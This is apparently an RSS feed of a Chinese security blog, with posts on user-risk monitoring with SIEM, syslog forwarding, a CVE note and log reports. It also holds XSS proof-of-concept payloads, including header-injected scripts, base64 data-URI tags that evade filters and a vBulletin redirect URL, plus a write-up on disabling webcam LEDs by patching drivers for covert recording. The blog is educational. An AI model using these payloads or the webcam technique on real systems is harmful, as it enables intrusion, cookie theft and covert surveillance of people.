&lt;p&gt;这个大家都很熟悉了。钓鱼，社工库，丢优盘，送路由之类的。利用人性的一些特点来实现攻击。&lt;/p&gt;

&lt;p&gt;缓解的方法通常就是进行用户安全意识培训，尤其通过一些实例，比如模拟钓鱼，然后公开钓鱼的成果，这样用户印象会比较深刻。下次遇到类似的情况就会考虑多一些。&lt;/p&gt;

&lt;h2 id='id2675'&gt;用户的密码&lt;/h2&gt;

&lt;p&gt;首先是弱密码，尽管可能有各种防止弱密码的策略。但是工作中首先考虑的是更好更快的完成工作。所以弱密码还是很常见的。此外还可能有很多别的途径可能泄露了密码，像工作中临时提供给需要的第三方没有及时修改等等。&lt;/p&gt;

&lt;p&gt;降低风险的方式就是实行严格的密码设置策略。不过包含数字字母符号的密码可能依然是字典里存在的弱密码。&lt;/p&gt;

&lt;h2 id='id2676'&gt;用户资产存在漏洞&lt;/h2&gt;

&lt;p&gt;大公司可能会对所有的办公电脑统一管理，按时升级各种补丁。但是现在有越来越多的设备类型，笔记本，手机，平板等都可能在工作中用到。而这些设备是否存在漏洞，是否安装补丁是用户自己负责的。办公电脑上用户自己安装的第三方软件，比如浏览器等等可能也没有统一的补丁升级策略。&lt;/p&gt;

&lt;p&gt;降低风险的方法可以通过定期的漏洞扫描来降低风险。&lt;/p&gt;

&lt;h2 id='id2677'&gt;使用各种云服务&lt;/h2&gt;

&lt;p&gt;云服务的应用越来越广泛，就拿网盘来说，大家都在用。假如把公司的资料放在网盘上是否存在风险呢。如果一些大的网盘提供商被入侵或是数据泄露，那么后果是不堪设想的。其实敏感资料放在第三方之后，就已经不是自己可控的了。&lt;/p&gt;

&lt;p&gt;降低风险的方法可以培训用户安全意识，尽量选择靠谱的大公司的服务，一些非常重要的资料不要放到第三方那里。&lt;/p&gt;

&lt;h2 id='id2678'&gt;移动设备&lt;/h2&gt;

&lt;p&gt;移动互联网今天已经如此火爆了。手机中通常也会有工作的资料，比如手机登陆了工作邮箱，手机联系人，甚至邮箱密码等。&lt;/p&gt;

&lt;p&gt;不仅仅是丢手机，把手机借给别人会导致信息泄露。现在手机更新换代都很快，就调查eBay上卖的二手手机，依然保存有私人数据的比例超过50%。考虑到数据恢复技术，这种风险可能更大。不知道taobao上的这个比例能有多少。&lt;/p&gt;

&lt;p&gt;前面提到过，手机其实很少有定期打补丁。所以恶意APP导致信息泄露的风险也很高。&lt;/p&gt;

&lt;p&gt;因为这个是用户自己控制的设备。所以我能想到的降低风险方法可能就是所谓的制定安全策略，进行安全意识培训。&lt;/p&gt;

&lt;h2 id='id2679'&gt;解决方案的探讨&lt;/h2&gt;

&lt;p&gt;从SIEM的角度来说可以进行用户活动监控，管控风险。&lt;a href='http://en.wikipedia.org/wiki/Security_information_and_event_management'&gt;SIEM&lt;/a&gt;简单来说就是收集环境内的各种设备和应用的安全事件，进行统一解析和关联分析从而进行风险管理和告警的产品。&lt;/p&gt;

&lt;p&gt;用户活动监控的概念其实我们都很常用。就是QQ账号异地登陆会有风险提示或者高危操作会锁定账号。把这个概念扩展到用户登陆公司邮箱，登陆服务器等等账号的活动。下面通过两个场景看一下这个解决方案的思想。&lt;/p&gt;

&lt;h2 id='id2680'&gt;场景一：社工邮箱密码&lt;/h2&gt;

&lt;p&gt;攻击者先用awvs扫描公司主页，一番尝试没有发现可以利用的漏洞。然后通过whois查询到网站管理员的工作邮箱。通过一些简单社工和查询社工库获得了该管理员的常用密码，很不幸的是这个常用密码恰好也是管理员工作邮箱的密码。所以攻击者顺利登陆了管理员的邮箱。&lt;/p&gt;

&lt;p&gt;那么这个过程中，SIEM看到的是什么过程呢。首先awvs扫描网站，siem获取到这些网站日志之后，认为这个来源ip在进行尝试攻击的行为，会把这个ip加入一个黑名单当中。当攻击者登陆邮箱的时候，这时候是从一个黑名单IP登陆了高级别的管理员邮箱（可以对不同人员的账号进行风险评级，就跟对资产进行分级一样）。系统会发出告警。甚至可以临时禁用这个邮箱账号。&lt;/p&gt;

&lt;h2 id='id2681'&gt;场景二：控制员工笔记本获取到敏感信息&lt;/h2&gt;

&lt;p&gt;公司员工由于在社交网站上点击了一个链接导致个人笔记本被控制。攻击者在笔记本上发现了一个公司服务器的ssh账号。那么攻击者在登陆服务器的时候SIEM可以做些什么呢。&lt;/p&gt;

&lt;p&gt;ssh登陆服务器，一般都是在公司内，也就是用内网地址登陆的。所以SIEM可以内置登陆ip的白名单。根据公司的工作习惯，可以设置登陆时间一般是早九点到晚九点。那么当攻击者登陆服务器的时候，如果没有用员工电脑做跳板，直接登陆的话。SIEM会看到一个别的地区的ip（比如美国）登陆了我们的服务器，会产生告警事件。如果攻击者为了隐蔽，选择在夜深人静的午夜登陆服务器，那么刚好触发了在非正常时间登陆的策略，也会产生告警。&lt;/p&gt;

&lt;p&gt;不恰当的地方还请大家多多指正。&lt;/p&gt;

&lt;h2 id='id2682'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2013-036551'&gt;从一个司机的邮箱开始测试新网&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.freebuf.com/articles/others-articles/16505.html'&gt;新型威胁分析与防范研究&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2014/01/02/user-based-risk</link>
                <guid>http://username.github.io/2014/01/02/user-based-risk</guid>
                <pubDate>2014-01-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>logger命令发送文本到syslog</title>
                <description>&lt;p&gt;本来想利用syslog服务把文本文件发送到远程主机。结果发现hp-unix使用的是syslogd，之前测试用rsyslog可以发送文件。而syslogd没找到这个特性。然后搜索资料的时候发现了logger这个命令，可以把文本转换成syslog发送出来。只是hp-unix的logger版本没有直接发送到远程主机的选项。而且logger不能实时的监控文件，所以采用一个曲折的办法，没发送一次清空文件内容。&lt;/p&gt;

&lt;p&gt;大致的命令如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat /var/weblogic/access.log &amp;gt; /var/tosyslog.txt &amp;amp;&amp;amp; echo &amp;quot;&amp;quot; &amp;gt; /var/weblogic/access.log &amp;amp;&amp;amp; logger -p user.emerge -f /var/tosyslog.txt&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;user.emerge 是syslog协议规定的事件来源是等级，可以修改。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/30/loggersyslog</link>
                <guid>http://username.github.io/2013/12/30/loggersyslog</guid>
                <pubDate>2013-12-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>how to disable webcam light on windows</title>
                <description>&lt;p&gt;http://blog.erratasec.com/2013/12/how-to-disable-webcam-light-on-windows.html#.Ur1X8X_8PZg&lt;/p&gt;

&lt;p&gt;最近不少新闻说FBI能够不开摄像头led灯的情况下打开摄像头。一些研究人员也发表文章称在一些老版本的Macbook上测试成功了。可以参考&lt;a href='http://www.freebuf.com/news/21579.html'&gt;破解苹果MacBook摄像头进行秘密监控&lt;/a&gt;。不过苹果是高富帅玩的啊，我们吊丝还是搞搞windows吧。&lt;/p&gt;

&lt;h1 id='id2670'&gt;硬件，固件，驱动，软件&lt;/h1&gt;

&lt;p&gt;理论上来说，指示灯应该是一个硬件功能。当电源提供给摄像头的时候，也会提供电力到指示灯上。这样的话要想黑指示灯几乎是不可能的了。不过我不认为有人会这样来设计。&lt;/p&gt;

&lt;p&gt;在有些情况下，指示灯是固件控制的功能。摄像头会有自己的微处理器来执行代码，控制指示灯只是固件的一个小功能。但是，固件依然是某种形式的软件，这就给了我们进行篡改的机会。&lt;/p&gt;

&lt;p&gt;在有些情况下，是驱动控制着指示灯。可能是直接控制硬件的底层内核模式驱动，也可能是面向软件的高层的DLL文件。&lt;/p&gt;

&lt;h1 id='id2671'&gt;逆向工程&lt;/h1&gt;

&lt;p&gt;作为逆向工程师，我们收集了这些可能控制指示灯的软件/固件/驱动，然后在IDApro中调试，很快就发现了一些关键的地方。&lt;/p&gt;

&lt;p&gt;拿一个戴尔笔记本举例，我们发现摄像头的RealTek驱动中有一个函数“TurnOnOffLED()&amp;#8221;&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/webcamera1.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;简单的修改了一下，让这个函数执行打开指示灯，直接返回。下面是录制的一个演示视频：一开始是正常的，然后替换掉驱动的dll文件，打开摄像头之后，指示灯就不亮了。&lt;/p&gt;

&lt;p&gt;http://www.youtube.com/watch?v=w86OwkP7yUQ&lt;/p&gt;

&lt;h1 id='usb'&gt;关于USB设备&lt;/h1&gt;

&lt;p&gt;基本上所有的摄像头，包括笔记本内置的摄像头都是USB设备。对于usb摄像头，有一个标准叫&lt;a href='http://en.wikipedia.org/wiki/USB_video_device_class'&gt;UVC&lt;/a&gt;。按照这个标准，大部分设备可以在不使用 厂家定制驱动的情况正常运行在标准操作系统上（windows,linux,mac)。只有在使用一些高级特性才需要厂家提供的专用驱动。&lt;/p&gt;

&lt;p&gt;这个标准中同样也规定了led指示灯是由主机软件控制的。linux平台上，有一套UVC工具集，安装之后可以直接使用命令来控制指示灯的打开和关闭。包括在摄像头打开的情况下关闭指示灯。&lt;/p&gt;

&lt;p&gt;windows上要想实现的话看起来需要自己写一个过滤驱动。我们太懒了就没写，这也是上面的视频演示直接修改DLL文件的原因。不过我们认为FBI应该做了这件事，完成了一个针对UVC标准的过滤驱动，这样一个程序可以控制不同厂家的大部分摄像头指示灯。不然的话FBI就得针对不同的摄像头单独修改驱动。&lt;/p&gt;

&lt;p&gt;USB还有很多有趣的特性。它的设计理念是一个用户不需要root/administrator权限就可以安装使用。因此，有了”用户模式“的驱动这样的思想，非管理员用户可以安装USB设备的驱动来使用它。&lt;/p&gt;

&lt;p&gt;这个可以通过设备固件升级（Device Firmware Update，DFU）标准来实现。这意味着大多数情况下，没有管理员权限的用户可以更新摄像头的固件。文章开头提到的研究人员在2008 Macbook上就使用了这种方式。理论上来说，在现在的大部分windows 7笔记本上也是可行的。问题在于这种方式需要事先修改好各种摄像头芯片的固件。&lt;/p&gt;

&lt;h1 id='id2672'&gt;结论&lt;/h1&gt;

&lt;p&gt;上面的视频可以证明至少我们已经在一台windows机器上实现了不开指示灯的情况下录像。而我们的研究表明，在常见操作系统上的大部分不同厂家的摄像头都可以实现秘密录像。&lt;/p&gt;

&lt;h1 id='ps'&gt;PS&lt;/h1&gt;

&lt;p&gt;现在的MacBooks已经不使用USB摄像头了。所以UVC和DFU的方式在最新的macbook上是无效的。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/27/how-to-disable-webcam-light-on-windows</link>
                <guid>http://username.github.io/2013/12/27/how-to-disable-webcam-light-on-windows</guid>
                <pubDate>2013-12-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>CVE 2013 2186 Apache commons fileupload</title>
                <description>&lt;p&gt;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2186&lt;/p&gt;

&lt;p&gt;The DiskFileItem class in Apache Commons FileUpload, as used in Red Hat JBoss BRMS 5.3.1; JBoss Portal 4.3 CP07, 5.2.2, and 6.0.0; and Red Hat JBoss Web Server 1.0.2 allows remote attackers to write to arbitrary files via a NULL byte in a file name in a serialized instance.&lt;/p&gt;

&lt;p&gt;空字节阶段可以成功上传任意后缀文件。不知道原文表达的是不是这个意思。有些地方还提到可以传到任意目录，不知道是不是需要有path参数才可以。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/27/cve-2013-2186-apache-commons-fileupload</link>
                <guid>http://username.github.io/2013/12/27/cve-2013-2186-apache-commons-fileupload</guid>
                <pubDate>2013-12-27T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>top 6 log reports</title>
                <description>&lt;p&gt;http://chuvakin.blogspot.com/2013/12/sans-top-6-log-reports-reborn.html&lt;/p&gt;

&lt;p&gt;At its center are these top log report categories:&lt;/p&gt;

&lt;p&gt;Authentication and Authorization Reports Systems and Data Change Reports Network Activity Reports Resource Access Reports Malware Activity Reports Failure and Critical Error Reports&lt;/p&gt;

&lt;p&gt;The document can be used to figure out what to log, what to report on and what reports to review for various purposes.&lt;/p&gt;

&lt;p&gt;1,认证和授权报表&lt;/p&gt;

&lt;p&gt;2,系统和数据变更报表&lt;/p&gt;

&lt;p&gt;3,网络活动报表&lt;/p&gt;

&lt;p&gt;4,资源访问报表&lt;/p&gt;

&lt;p&gt;5,恶意软件活动报表&lt;/p&gt;

&lt;p&gt;6,失败和严重的错误报表&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/26/top-6-log-reports</link>
                <guid>http://username.github.io/2013/12/26/top-6-log-reports</guid>
                <pubDate>2013-12-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>搭建oracle和webloigc环境遇到的一些小问题</title>
                <description>&lt;p&gt;oracle的两个安装包要解压到一起，一开始意味跟windows安装的两个iso一样先后顺序安装。。结果装了两次都是缺少文件。汗。。&lt;/p&gt;

&lt;p&gt;weblogic的域的概念，adminserver之类还是搞的不是很清楚。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/26/oraclewebloigc</link>
                <guid>http://username.github.io/2013/12/26/oraclewebloigc</guid>
                <pubDate>2013-12-26T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>XSS, Command and SQL Injection vectors: Beyond the Form</title>
                <description>&lt;p&gt;这不是一篇介绍介绍技术的文章，只是一种开放思维的尝试。主要着重于当遇到输入过滤的情况下，如何找到可以利用的输入点。&lt;/p&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input1.png' /&gt;&lt;/p&gt;

&lt;p&gt;本质上来说如果要进行xss攻击，只要找到一个未过滤的输入点。输入的数据在支持脚本的软件（不仅限于浏览器）里解析就可以了。sqli也是类似的道理。而输入点并不仅仅是网页里的表单，只要去发现，输入点无处不在。下面介绍一些抛砖引玉的想法，也欢迎大家分享自己的思路。&lt;/p&gt;

&lt;h1 id='user_agent_'&gt;user agent 字段&lt;/h1&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input2.png' /&gt;&lt;/p&gt;

&lt;p&gt;不仅仅是useragent字段，还包括头部的其他字段。比如把useragent改成&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;lt;script&amp;gt;window.location = &amp;quot;http://www.freebuf.com/&amp;quot;&amp;lt;/script&amp;gt;&amp;quot; &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;很多日志分析工具都是生成html格式的报告，如果这个字段没有合适的过滤编码就输出在html里，管理员查看的时候就会执行插入的js了。&lt;/p&gt;

&lt;h1 id='ssids'&gt;SSIDs&lt;/h1&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input3.png' /&gt;&lt;/p&gt;

&lt;p&gt;这只是一个假想的攻击方式，SSIDs可以有32个字符甚至看可以包含不能打印的ASCII，SSID可能出现在某些记录wifi连接记录的日志里。&lt;/p&gt;

&lt;h1 id='id2667'&gt;事件日志&lt;/h1&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input4.png' /&gt;&lt;/p&gt;

&lt;p&gt;很多人分析日志都会用第三方的日志查看工具。如果我们用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;作为用户名尝试登陆，登陆失败后会记录在日志中。第三方工具如果没有合适的过滤编码字符串，管理员查看工具生成的html格式的报告时就可能受到xss攻击。&lt;/p&gt;

&lt;h1 id='id2668'&gt;计算机名和描述&lt;/h1&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input5.png' /&gt;&lt;/p&gt;

&lt;p&gt;这个场景我在Softperfect&amp;#8217;s NetScan实践过。在这里插入xss代码，当渗透测试人员查看扫描报告的时候。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input6.png' /&gt;&lt;/p&gt;

&lt;h1 id='id2669'&gt;应用的名字和元数据&lt;/h1&gt;

&lt;p&gt;&lt;img alt='input' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/.input7.png' /&gt;&lt;/p&gt;

&lt;p&gt;一些管理软件会列出来电脑上安装的软件信息，如果是用html来实现。。。&lt;/p&gt;

&lt;h1 id='banners'&gt;Banners&lt;/h1&gt;

&lt;p&gt;大多网络扫描器都可以识别banner，而且可以输出多种格式，html，xml等。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/25/xss-command-and-sql-injection-vectors-beyond-the-form</link>
                <guid>http://username.github.io/2013/12/25/xss-command-and-sql-injection-vectors-beyond-the-form</guid>
                <pubDate>2013-12-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>svn 常用命令</title>
                <description>&lt;p&gt;下载远程代码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;svn checkout svn://127.0.0.1&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/12/25/svn-</link>
                <guid>http://username.github.io/2013/12/25/svn-</guid>
                <pubDate>2013-12-25T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>data uri scheme的那些事</title>
                <description>&lt;h1 id='id2665'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;http://dataurl.net/#dataurlmaker&lt;/p&gt;

&lt;p&gt;http://www.gnucitizen.org/blog/self-contained-xss-attacks/&lt;/p&gt;

&lt;p&gt;http://sb.f4ck.org/forum.php?mod=viewthread&amp;amp;tid=14202&amp;amp;highlight=data%2Buri&lt;/p&gt;

&lt;p&gt;http://en.wikipedia.org/wiki/Data_URI_scheme&lt;/p&gt;

&lt;p&gt;http://palizine.plynt.com/issues/2010Oct/bypass-xss-filters/&lt;/p&gt;

&lt;p&gt;http://mramydnei.blogspot.jp/2013/12/referrer-xss.html&lt;/p&gt;

&lt;p&gt;https://developers.google.com/closure/templates/docs/security&lt;/p&gt;

&lt;p&gt;http://blog.kotowicz.net/2012/04/fun-with-data-urls.html&lt;/p&gt;

&lt;p&gt;http://dopiaza.org/tools/datauri/index.php&lt;/p&gt;

&lt;h1 id='data_uri_scheme'&gt;什么是Data URI scheme&lt;/h1&gt;

&lt;p&gt;大家对URL(Uniform Resource Location)肯定都很熟悉，URL是URI(Uniform Resource Identifier)常用协议的一个子集。Data URI是&lt;a href='https://www.ietf.org/rfc/rfc2397.txt'&gt;RFC2397&lt;/a&gt;定义的一种将小文件直接嵌入文档的方案（RFC2397是1998年发布的）。它的协议格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;data:[&amp;lt;mime type&amp;gt;][;charset=&amp;lt;charset&amp;gt;][;base64],&amp;lt;encoded data&amp;gt;

data 指URI协议类型
mine type 指数据类型，如png图片为 image/png;默认是text/plain
chartset 制定数据的编码方式，比如base64，默认是charset=US-ASCII
encoded data 就是编码之后的数据了&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面通过一些示例来理解一下data uri的应用&lt;/p&gt;

&lt;h1 id='data_uri'&gt;data uri的一些使用范例&lt;/h1&gt;

&lt;p&gt;通常我们在网页中嵌入图片使用的是如下的方式：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;http://192.168.1.1/images/myimage.gif&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而下面一个img标签的src指向不是一个外部的URL，而是一个data uri。把这个img标签贴到html文档里访问。 &lt;img src='data:image/gif;base64,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' /&gt;&lt;/p&gt;

&lt;p&gt;可以看到如下一个图片。&lt;/p&gt;

&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri1.png' /&gt;&lt;/p&gt;

&lt;p&gt;如果打开burpsuite代理，会发现，并没有新的网络请求。我们看到的这个图片就是base64编码之后保存在html文档里的。也就是前面提到过的将小文件嵌入了html文档。。。当前各种主流的浏览器基本都支持data uri。只是在某些特性方面有差异。本文测试，截图均为firefox。关于data uri在不同浏览器的表现特性后面单独描述。&lt;/p&gt;

&lt;p&gt;当然，data uri不仅仅可以把图片嵌入html，还可以把别的文档类型，比如doc，mp3,html等嵌入html。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;data:application/msword;base64,0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7&amp;quot; &amp;gt;test&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用firefox打开这个html文件，点击test，会提示下载一个doc文档。&lt;/p&gt;

&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri2.png' /&gt;&lt;/p&gt;

&lt;p&gt;当然script的src属性也是可以用data uri协议的。我的理解一般可以写URL指定资源的地方都可以换成data uri。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;data:text/javascript;,alert(&amp;#39;hello,world&amp;#39;)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri3.png' /&gt;&lt;/p&gt;

&lt;p&gt;So，我们看到了可以执行js，而且data uri的payload可以用多种编码，比如base64,从而可以躲避某些黑名单的检测。&lt;/p&gt;

&lt;h1 id='data_urixss'&gt;data uri在xss中的利用&lt;/h1&gt;

&lt;p&gt;提到Data:URI scheme在xss中的应用知名度最高的可能就是黑哥在08年写的一篇博客了。写这篇文章的时候发现RSnake大神在某文章评论说，早在04年左右的时候这个vector就出现在xss cheat里了（参考资料1）。&lt;/p&gt;

&lt;p&gt;黑哥博客写的案例是http://seclists.org/fulldisclosure/2008/Jun/181 ，因为这个博客已经打不开了，所以这里复述一下这个案例。&lt;/p&gt;

&lt;p&gt;通过访问一下URL触发：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;admincp/index.php?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;源代码 admincp/index.php 98-107&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if (!empty($vbulletin-&amp;gt;GPC[&amp;#39;redirect&amp;#39;]))
{
require_once(DIR . &amp;#39;/includes/functions_login.php&amp;#39;);
$redirect = htmlspecialchars_uni(fetch_replaced_session_url($vbulletin-&amp;gt;GPC[&amp;#39;redirect&amp;#39;]));

print_cp_header($vbphrase[&amp;#39;redirecting_please_wait&amp;#39;], &amp;#39;&amp;#39;, &amp;quot;&amp;lt;meta http-equiv=\&amp;quot;Refresh\&amp;quot; content=\&amp;quot;0; URL=$redirect\&amp;quot; /&amp;gt;&amp;quot;);
echo &amp;quot;&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;lt;/p&amp;gt;&amp;lt;blockquote&amp;gt;&amp;lt;p&amp;gt;$vbphrase[redirecting_please_wait]&amp;lt;/p&amp;gt;&amp;lt;/blockquote&amp;gt;&amp;quot;;
print_cp_footer();
exit;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;http-equiv 里的url使用data:text/html 实现xss。&lt;/p&gt;

&lt;p&gt;这种xss我的理解就是利用一个URL跳转。因为这里本质上就是跳转到一个html页面，只是这个html页面不是用url指定，而是用了data uri协议。直接把这个html页面传了进来。所以这里的xss就相当于跳转到了一个新的页面，而新的页面存在javascript，然后执行了js。这个新页面执行的js当然无法继承跳转之前的页面的域。这种类型的任意url跳转也都可以用data uri变成这种类型的xss。opera曾经出过一个bug，这样执行的js继承了跳转来源页面的域（参考资料2）。这样子的化危害就扩大了。&lt;/p&gt;

&lt;p&gt;data uri在xss领域最常见的应用就是前面提到过的用来绕过富文本的过滤器。下面这样一个payload&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;没有常见的javascript，script之类的敏感词。所以一些黑名单的过滤器可能会漏掉这种情况。但是利用data uri的xss跟通常的xss有些不一样。老外用self-contained xss来命名。因为我们看到data uri的payload通常就是嵌入一个包含js的html文档。而chrome在执行的时候，认为js的域为空白域。&lt;/p&gt;

&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri4.png' /&gt;&lt;/p&gt;

&lt;p&gt;只有firefox和opera（只测试了firefox）认为这样执行的js继承了当前页面的域。这样子就是传统意义上的xss，可以直接获取cookie了。&lt;/p&gt;

